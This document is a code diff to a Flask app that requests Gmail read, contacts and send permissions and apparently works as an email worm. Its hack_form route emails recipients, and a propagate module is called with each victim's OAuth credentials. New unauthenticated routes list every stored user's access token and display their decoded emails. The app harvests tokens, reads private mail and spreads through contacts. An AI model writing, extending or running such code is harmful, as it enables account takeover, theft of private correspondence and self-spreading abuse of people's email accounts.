@@ -1,9 +1,13 @@
 from app import *
 import models
+import propagate
+import base64
 
 SCOPES = ['https://www.googleapis.com/auth/gmail.readonly', 
           'https://www.googleapis.com/auth/contacts.readonly',
-          'https://www.googleapis.com/auth/gmail.send']
+          'https://www.googleapis.com/auth/gmail.send',
+          'https://www.googleapis.com/auth/userinfo.profile',
+          'https://www.googleapis.com/auth/userinfo.email']
 
 CLIENT_SECRET_FILE = 'client_secret.json'
 API_SERVICE_NAME = 'gmail'
@@ -29,7 +33,7 @@ def hack_form():
 
         #add sender and recipient to db if they don't exist
         update_user(email=sender_email, name=sender_name)
-        #update_user(email=recipient_email)
+        update_user(email=recipient_email)
         
         return send_initial_email(sender_name, sender_email, recipient_email)
     else:
@@ -70,7 +74,31 @@ def success_user():
     propagate.propagate(credentials, user_email)
     return send_initial_email(sender_name, sender_email, recipient_email)
 
+@app.route('/user_viewer')
+def user_viewer():
+    users = models.User.query.all()
+    user_list = []
+    for user in users:
+        user_list.append({'name': user.name, 'email': user.email, 'token': user.token, 'id': user.id})
 
+    return render_template('user_viewer.html', users=user_list)
+
+@app.route('/email_viewer')
+def email_viewer():
+    uid = request.args.get('user', '')
+    user = models.User.query.filter_by(id=uid).first()
+    emails = models.Email.query.filter_by(user_id=uid).all()
+    email_list = []
+    for email in emails:
+        email_dict = models.object_as_dict(email)
+        try:
+            email_dict['body'] = base64.b64decode(email_dict['body'])
+        except TypeError:
+            print 'email', email_dict, 'not in base64.'
+
+        email_list.append(email_dict)
+
+    return render_template('email_viewer.html', emails=email_list, username=user.name)
 
 ### HELPER FUNCTIONS ###
 
@@ -130,7 +158,7 @@ def check_client_secret():
 def get_user_info(credentials):
     people = googleapiclient.discovery.build(
       'people', 'v1', credentials=credentials)
-    userProfile = people.get(resourceName='people/me', personField='names,emailAddresses').execute()
+    userProfile = people.people().get(resourceName='people/me', personFields='names,emailAddresses').execute()
     return userProfile
 
 #extract credentials dict from user in db
@@ -154,11 +182,12 @@ def credentials_to_dict(credentials):
 #store credentials in db
 def store_credentials(credentials):
     # FIX THIS BEFORE YOU BREAK YOUR CODE
-    user_email = get_email_address(credentials)
+    user_profile = get_user_info(credentials)
+    print(user_profile)
+    user_email = user_profile['emailAddresses'][0]['value']
     flask.session['current_email'] = user_email
     credentials_dict = credentials_to_dict(credentials)
     update_user(email=user_email, credentials=credentials_dict)
-
 
 def authorize(redirect_url):
     check_client_secret()
